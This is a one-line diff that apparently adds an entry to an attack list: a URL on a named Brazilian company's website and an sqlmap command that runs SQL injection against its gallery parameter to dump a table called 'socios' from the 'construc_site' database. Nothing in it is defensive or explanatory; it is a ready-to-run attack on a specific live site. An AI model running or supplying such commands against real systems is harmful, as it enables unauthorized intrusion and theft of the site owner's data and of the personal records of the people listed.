@@ -1,0 +1,1 @@
+https://www.construcep.com.br/exibirgaleria.php?id_galeria=9 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.construcep.com.br/exibirgaleria.php?id_galeria=9 -D construc_site -T socios --dump
